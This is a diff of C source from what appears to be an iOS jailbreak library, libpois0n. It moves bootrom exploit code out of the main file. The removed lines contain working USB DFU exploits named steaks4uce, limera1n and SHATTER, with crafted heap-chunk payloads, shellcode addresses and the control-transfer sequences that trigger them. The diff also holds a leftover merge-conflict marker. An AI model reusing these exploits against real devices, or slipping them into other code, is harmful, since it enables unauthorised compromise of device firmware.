@@ -6,23 +6,11 @@
 #include "libpartial.h"
 #include "libirecovery.h"
 
-//#define SHATTER
-#define LIMERA1N
-#define STEAKS4UCE
-
-#ifdef SHATTER
-#include "shatter.h"
-#endif
-
-#ifdef LIMERA1N
-#include "limera1n.h"
-#endif
-
-#ifdef STEAKS4UCE
-#include "steaks4uce.h"
-#endif
-
+#include "common.h"
 #include "ramdisk.h"
+#include "exploits.h"
+#include "payloads.h"
+
 #include "payloads/iBSS.k66ap.h"
 #include "payloads/iBSS.k48ap.h"
 #include "payloads/iBSS.n88ap.h"
@@ -38,9 +26,6 @@
 #include "payloads/iBoot.n18ap.h"
 #include "payloads/iBoot.n81ap.h"
 
-int libpois0n_debug = 1;
-static irecv_client_t client = NULL;
-static irecv_device_t device = NULL;
 static pois0n_callback progress_callback = NULL;
 static void* user_object = NULL;
 
@@ -344,275 +329,6 @@ int upload_firmware_payload(char* type) {
 	return 0;
 }
 
-#ifdef STEAKS4UCE
-int steaks4uce_exploit() {
-	irecv_error_t error = 0;
-	int i, ret;
-	unsigned char data[0x800];
-	unsigned char payload[] = {
-				/* free'd buffer dlmalloc header: */
-				0x84, 0x00, 0x00, 0x00, // 0x00: previous_chunk
-				0x05, 0x00, 0x00, 0x00, // 0x04: next_chunk
-				/* free'd buffer contents: (malloc'd size=0x1C, real size=0x20, see sub_9C8) */
-				0x80, 0x00, 0x00, 0x00, // 0x08: (0x00) direction
-				0x80, 0x62, 0x02, 0x22, // 0x0c: (0x04) usb_response_buffer
-				0xff, 0xff, 0xff, 0xff, // 0x10: (0x08)
-				0x00, 0x00, 0x00, 0x00, // 0x14: (0x0c) data size (filled by the code just after)
-				0x00, 0x01, 0x00, 0x00, // 0x18: (0x10)
-				0x00, 0x00, 0x00, 0x00, // 0x1c: (0x14)
-				0x00, 0x00, 0x00, 0x00, // 0x20: (0x18)
-				0x00, 0x00, 0x00, 0x00, // 0x24: (0x1c)
-				/* attack dlmalloc header: */
-				0x15, 0x00, 0x00, 0x00, // 0x28: previous_chunk
-				0x02, 0x00, 0x00, 0x00, // 0x2c: next_chunk : 0x2 choosed randomly :-)
-				0x01, 0x38, 0x02, 0x22, // 0x30: FD : shellcode_thumb_start()
-				//0x90, 0xd7, 0x02, 0x22, // 0x34: BK : free() LR in stack
-				0xfc, 0xd7, 0x02, 0x22, // 0x34: BK : exception_irq() LR in stack
-				};
-
-	info("Executing steaks4uce exploit ...\n");
-	debug("Reseting usb counters.\n");
-	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
-	if (ret < 0) {
-		error("Failed to reset usb counters.\n");
-		return -1;
-	}
-
-	debug("Padding to 0x23800...\n");
-	memset(data, 0, 0x800);
-	for(i = 0; i < 0x23800 ; i+=0x800)  {
-		ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
-		if (ret < 0) {
-			error("Failed to push data to the device.\n");
-			return -1;
-		}
-	}
-	debug("Uploading shellcode.\n");
-	memset(data, 0, 0x800);
-	memcpy(data, steaks4uce, sizeof(steaks4uce));
-	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
-	if (ret < 0) {
-		error("Failed to upload shellcode.\n");
-		return -1;
-	}
-
-	debug("Reseting usb counters.\n");
-	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
-	if (ret < 0) {
-		error("Failed to reset usb counters.\n");
-		return -1;
-	}
-
-	int send_size = 0x100 + sizeof(payload);
-	*((unsigned int*) &payload[0x14]) = send_size;
-	memset(data, 0, 0x800);
-	memcpy(&data[0x100], payload, sizeof(payload));
-
-	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size , 1000);
-	if (ret < 0) {
-		error("Failed to send steaks4uce to the device.\n");
-		return -1;
-	}
-	ret = irecv_control_transfer(client, 0xA1, 1, 0, 0, data, send_size , 1000);
-	if (ret < 0) {
-		error("Failed to execute steaks4uce.\n");
-		return -1;
-	}
-	info("steaks4uce sent & executed successfully.\n");
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		debug("%s\n", irecv_strerror(error));
-		error("Unable to reconnect\n");
-		return -1;
-	}
-
-	return 0;
-}
-#endif
-
-#ifdef LIMERA1N
-int limera1n_exploit() {
-	irecv_error_t error = 0;
-	unsigned int i = 0;
-	unsigned char buf[0x800];
-	unsigned char shellcode[0x800];
-	unsigned int max_size = 0x24000;
-	unsigned int load_address = 0x84000000;
-	unsigned int stack_address = 0x84033F98;
-	unsigned int shellcode_address = 0x84023001;
-	unsigned int shellcode_length = 0;
-
-
-	if (device->chip_id == 8930) {
-		max_size = 0x2C000;
-		stack_address = 0x8403BF9C;
-		shellcode_address = 0x8402B001;
-	}
-	if (device->chip_id == 8920) {
-		max_size = 0x24000;
-		stack_address = 0x84033FA4;
-		shellcode_address = 0x84023001;
-	}
-
-	memset(shellcode, 0x0, 0x800);
-	shellcode_length = sizeof(limera1n);
-	memcpy(shellcode, limera1n, sizeof(limera1n));
-	
-	debug("Resetting device counters\n");
-	error = irecv_reset_counters(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	memset(buf, 0xCC, 0x800);
-	for(i = 0; i < 0x800; i += 0x40) {
-		unsigned int* heap = (unsigned int*)(buf+i);
-		heap[0] = 0x405;
-		heap[1] = 0x101;
-		heap[2] = shellcode_address;
-		heap[3] = stack_address;
-	}
-
-	debug("Sending chunk headers\n");
-	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
-
-	memset(buf, 0xCC, 0x800);
-	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
-		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
-	}
-
-	debug("Sending exploit payload\n");
-	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
-
-	debug("Sending fake data\n");
-	memset(buf, 0xBB, 0x800);
-	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
-	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
-
-	//debug("Executing exploit\n");
-	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
-
-	irecv_reset(client);
-	irecv_finish_transfer(client);
-	debug("Exploit sent\n");
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		debug("%s\n", irecv_strerror(error));
-		error("Unable to reconnect\n");
-		return -1;
-	}
-
-	return 0;
-}
-#endif
-
-#ifdef SHATTER
-int shatter_exploit() {
-	irecv_error_t error = 0;
-
-	debug("Resetting device counters\n");
-	error = irecv_reset_counters(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	debug("Shifting upload pointer\n");
-	if(receive_data(0x80)) {
-		error("Unable to shift upload counter\n");
-		return -1;
-	}
-
-	debug("Resetting device\n");
-	irecv_reset(client);
-
-	debug("Finishing shift transaction\n");
-	error = irecv_finish_transfer(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		error("Unable to reconnect to device\n");
-		return -1;
-	}
-
-	debug("Overwriting SHA1 registers\n");
-	if(receive_data(0x2C000)) {
-		error("Unable to overwrite SHA1 registers\n");
-		return -1;
-	}
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		error("Unable to reconnect to device\n");
-		return -1;
-	}
-
-	debug("Resetting device counters\n");
-	error = irecv_reset_counters(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	debug("Shifting upload pointer\n");
-	if(receive_data(0x140)) {
-		error("Unable to shift upload counter\n");
-		return -1;
-	}
-
-	debug("Resetting device\n");
-	irecv_reset(client);
-
-	debug("Finishing shift transaction\n");
-	error = irecv_finish_transfer(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		error("Unable to reconnect to device\n");
-		return -1;
-	}
-
-	debug("Sending exploit data\n");
-	error = irecv_send_buffer(client, (unsigned char*) shatter, sizeof(shatter), 0);
-	if(error != IRECV_E_SUCCESS) {
-		error("Unable to send exploit data\n");
-		return -1;
-	}
-
-	debug("Forcing prefetch abort exception\n");
-	if(receive_data(0x2C000)) {
-		error("Unable to force prefetch abort exception\n");
-		return -1;
-	}
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		debug("%s\n", irecv_strerror(error));
-		error("Unable to reconnect\n");
-		return -1;
-	}
-
-	return 0;
-}
-#endif
-
 int upload_ibss() {
 	if(upload_dfu_image("iBSS") < 0) {
 		error("Unable upload iBSS\n");
@@ -772,10 +488,6 @@ int boot_ramdisk() {
 		return -1;
 	}
 
-<<<<<<< HEAD
-		// This is an untethered jailbreak
-=======
->>>>>>> appletv
 	irecv_setenv(client, "boot-args", "0");
 	irecv_setenv(client, "auto-boot", "true");
 	irecv_saveenv(client);
@@ -787,7 +499,6 @@ int boot_ramdisk() {
 	}
 
 	return 0;
-	*/
 }
 
 int boot_tethered() {
